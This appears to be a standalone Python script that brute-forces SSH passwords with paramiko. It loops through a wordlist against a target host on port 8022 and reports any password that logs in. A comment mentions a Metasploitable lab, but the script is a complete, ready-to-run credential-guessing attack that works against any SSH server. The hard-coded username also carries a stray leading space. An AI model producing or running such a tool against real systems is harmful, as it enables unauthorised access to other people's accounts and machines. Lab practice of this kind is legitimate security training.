import paramiko
import socket

def ssh_brute_force(target_ip, username, password_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(password_file, 'r') as file:
            for line in file:
                password = line.strip()
                try:
                    print(f"[*] Testing: {password}")
                    ssh.connect(target_ip, username=username, password=password, timeout=2, port=8022)
                    print(f"[!] SUCCESS: Password found: {password}")
                    ssh.close()
                    return # Stop once we find it
                except paramiko.AuthenticationException:
                    continue # Wrong password, try next
                except socket.error as e:
                    print(f"[X] Connection error: {e}")
                    return
    except FileNotFoundError:
        print("[X] Error: Password file not found. Run gen_wordlist.py first!")

# Change these to match your Metasploitable lab IP
target = "127.0.0.1"
user =" u0_a427"
pass_list = "custom_passwords.txt"

if __name__ == "__main__":
    ssh_brute_force(target, user, pass_list)

